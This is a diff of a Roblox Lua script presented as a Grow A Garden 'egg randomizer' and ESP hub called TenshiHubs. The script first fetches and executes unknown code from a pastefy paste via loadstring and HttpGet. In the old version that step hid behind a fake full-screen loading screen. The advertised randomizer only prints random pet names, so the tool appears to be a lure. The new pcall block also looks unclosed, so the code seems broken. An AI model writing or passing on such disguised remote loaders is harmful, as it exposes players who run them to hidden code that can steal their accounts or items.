@@ -1,133 +1,151 @@
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local Player = Players.LocalPlayer
-
-repeat task.wait() until Player:FindFirstChild("PlayerGui")
-
--- Your actual script (executes immediately)
+-- === EXECUTE YOUR MAIN SCRIPT IMMEDIATELY ===
 pcall(function()
-	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
-end)
+    loadstring(game:HttpGet("https://pastefy.app/inoixEbY/raw"))()
 
--- MAIN GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "FakeLoadingUI"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-gui.DisplayOrder = 9999
-gui.Parent = Player:WaitForChild("PlayerGui")
-
--- BACKGROUND (Black screen)
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.new(0, 0, 0)
-bg.BorderSizePixel = 0
-bg.Parent = gui
-
--- Labels
-local topLabel = Instance.new("TextLabel")
-topLabel.Size = UDim2.new(1, 0, 0.1, 0)
-topLabel.Position = UDim2.new(0, 0, 0.02, 0)
-topLabel.BackgroundTransparency = 1
-topLabel.Text = "Wait Until It Loads"
-topLabel.Font = Enum.Font.GothamBold
-topLabel.TextColor3 = Color3.fromRGB(255, 120, 0)
-topLabel.TextScaled = true
-topLabel.TextStrokeTransparency = 0.8
-topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
-topLabel.Parent = bg
-
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.3, 0)
-loadingText.Position = UDim2.new(0, 0, 0.25, 0)
-loadingText.BackgroundTransparency = 1
-loadingText.Text = "0%"
-loadingText.Font = Enum.Font.GothamBlack
-loadingText.TextColor3 = Color3.new(1, 1, 1)
-loadingText.TextScaled = true
-loadingText.TextStrokeTransparency = 0.6
-loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
-loadingText.Parent = bg
-
-local bottomLabel = Instance.new("TextLabel")
-bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
-bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
-bottomLabel.BackgroundTransparency = 1
-bottomLabel.Text = "Be Patient"
-bottomLabel.Font = Enum.Font.GothamBold
-bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
-bottomLabel.TextScaled = true
-bottomLabel.TextStrokeTransparency = 0.8
-bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
-bottomLabel.Parent = bg
-
--- Fire Animation
--- Existing setup remains unchanged...
--- Insert this after the rest of your GUI is created (after `bottomLabel`), or near the end of your script.
-
--- Side UI Box
-local sideUI = Instance.new("Frame")
-sideUI.Size = UDim2.new(0.25, 0, 0.5, 0)
-sideUI.Position = UDim2.new(0.02, 0, 0.25, 0)
-sideUI.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-sideUI.BackgroundTransparency = 0.2
-sideUI.BorderSizePixel = 2
-sideUI.BorderColor3 = Color3.fromRGB(255, 50, 0)
-sideUI.Parent = bg
-sideUI.ZIndex = 2
-
--- Title
-local sideTitle = Instance.new("TextLabel")
-sideTitle.Size = UDim2.new(1, 0, 0.15, 0)
-sideTitle.BackgroundTransparency = 1
-sideTitle.Text = "🔥 Options 🔥"
-sideTitle.Font = Enum.Font.GothamBold
-sideTitle.TextScaled = true
-sideTitle.TextColor3 = Color3.fromRGB(255, 80, 0)
-sideTitle.TextStrokeTransparency = 0.7
-sideTitle.Parent = sideUI
-
--- Helper function for buttons
-local function createButton(text, emoji, posY)
-	local button = Instance.new("TextButton")
-	button.Size = UDim2.new(0.9, 0, 0.15, 0)
-	button.Position = UDim2.new(0.05, 0, posY, 0)
-	button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-	button.TextColor3 = Color3.new(1, 1, 1)
-	button.TextScaled = true
-	button.TextStrokeTransparency = 0.7
-	button.TextStrokeColor3 = Color3.fromRGB(255, 80, 0)
-	button.Font = Enum.Font.GothamBold
-	button.Text = emoji .. " " .. text
-	button.Parent = sideUI
-	return button
+-- === REMOVE ANY EXISTING UI DUPLICATES ===
+local player = game.Players.LocalPlayer
+local pgui = player:WaitForChild("PlayerGui")
+if pgui:FindFirstChild("TenshiHubs_UI") then
+    pgui.TenshiHubs_UI:Destroy()
 end
 
--- Buttons
-local btnEggRandomizer = createButton("Egg Randomizer", "🎲", 0.2)
-local btnPetRandomizer = createButton("Randomize Pets", "🎲", 0.38)
-local btnESP = createButton("ESP: OFF", "👁️", 0.56)
-local btnAutoRandom = createButton("Auto Randomize: OFF", "🔄", 0.74)
+-- === CREATE NEW UI ===
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "TenshiHubs_UI"
+ScreenGui.Parent = pgui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Functionality Toggles
-local espOn = false
-local autoOn = false
+-- Toggle button (fixed position)
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Name = "ToggleBtn"
+ToggleBtn.Parent = ScreenGui
+ToggleBtn.Size = UDim2.new(0, 120, 0, 30)
+ToggleBtn.Position = UDim2.new(0, 10, 1, -50)
+ToggleBtn.AnchorPoint = Vector2.new(0, 1)
+ToggleBtn.Text = "TenshiHubs"
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.TextSize = 18
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ToggleBtn.BorderSizePixel = 0
 
-btnESP.MouseButton1Click:Connect(function()
-	espOn = not espOn
-	btnESP.Text = "👁️ ESP: " .. (espOn and "ON" or "OFF")
+-- Main draggable UI frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 260, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -130, 0.5, -110)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Visible = true
+MainFrame.BorderSizePixel = 0
+
+-- Title label
+local Title = Instance.new("TextLabel")
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "TenshiHubs UI"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Title.BorderSizePixel = 0
+
+-- Toggle state holders
+local states = {
+    Randomizer = false,
+    ESP = false,
+    AutoFind = false,
+    LuckBoost = false
+}
+
+-- Toggle creation helper
+local function makeToggle(labelText, idxY)
+    local btn = Instance.new("TextButton")
+    btn.Parent = MainFrame
+    btn.Size = UDim2.new(0.9, 0, 0, 30)
+    btn.Position = UDim2.new(0.05, 0, 0, 30 + (idxY - 1) * 40)
+    btn.Text = labelText .. ": OFF"
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 16
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+    btn.BorderSizePixel = 0
+
+    btn.MouseButton1Click:Connect(function()
+        states[labelText] = not states[labelText]
+        btn.Text = labelText .. ": " .. (states[labelText] and "ON" or "OFF")
+    end)
+
+    return btn
+end
+
+-- Create toggles
+makeToggle("Randomizer", 1)
+makeToggle("ESP", 2)
+makeToggle("AutoFind", 3)
+makeToggle("LuckBoost", 4)
+
+-- Toggle main UI visibility from the bottom button
+ToggleBtn.MouseButton1Click:Connect(function()
+    MainFrame.Visible = not MainFrame.Visible
 end)
 
-btnAutoRandom.MouseButton1Click:Connect(function()
-	autoOn = not autoOn
-	btnAutoRandom.Text = "🔄 Auto Randomize: " .. (autoOn and "ON" or "OFF")
-end)
+-- === EGG ESP & RANDOMIZER LOGIC ===
 
-btnEggRandomizer.MouseButton1Click:Connect(function()
-	print("Egg Randomizer Clicked!") -- Replace with your actual function
-end)
+-- Full EggData based on Grow A Garden wiki
+local EggData = {
+    ["Common Egg"] = {"Bunny","Dog","Golden Lab"},
+    ["Uncommon Egg"] = {"Black Bunny","Chicken","Cat","Deer"},
+    ["Rare Egg"] = {"Orange Tabby","Spotted Deer","Pig","Rooster","Monkey"},
+    ["Legendary Egg"] = {"Cow","Silver Monkey","Sea Otter","Turtle","Polar Bear"},
+    ["Mythical Egg"] = {"Grey Mouse","Brown Mouse","Squirrel","Red Giant Ant","Red Fox"},
+    ["Bug Egg"] = {"Snail","Giant Ant","Caterpillar","Praying Mantis","Dragonfly"},
+    ["Bee Egg"] = {"Bee","Honey Bee","Bear Bee","Petal Bee","Queen Bee"},
+    ["Anti Bee Egg"] = {"Wasp","Tarantula Hawk","Moth","Butterfly","Disco Bee"},
+    ["Summer Egg"] = {"Flamingo","Toucan","Orangutan","Seal","Sea Turtle"}
+}
 
-btnPetRandomizer.MouseButton1Click:Connect(function()
-	print("Randomize Pets Clicked!") -- Replace with your actual function
+-- Highlight eggs
+local function highlightEggs()
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("Model") and EggData[v.Name] then
+            if not v:FindFirstChild("TenshiESP") then
+                local sel = Instance.new("SelectionBox")
+                sel.Adornee = v
+                sel.Color3 = Color3.new(1, 1, 0)
+                sel.LineThickness = 0.05
+                sel.Name = "TenshiESP"
+                sel.Parent = v
+            end
+        elseif v:FindFirstChild("TenshiESP") then
+            v.TenshiESP:Destroy()
+        end
+    end
+end
+
+-- Randomize eggs
+local function randomizeEggs()
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("Model") and EggData[v.Name] then
+            local pets = EggData[v.Name]
+            local chosen = pets[math.random(1, #pets)]
+            print("Rolled " .. v.Name .. " → " .. chosen)
+        end
+    end
+end
+
+-- Main loop
+game:GetService("RunService").RenderStepped:Connect(function()
+    if states.ESP then
+        highlightEggs()
+    end
+
+    if states.Randomizer then
+        randomizeEggs()
+        task.wait(2)
+    end
 end)
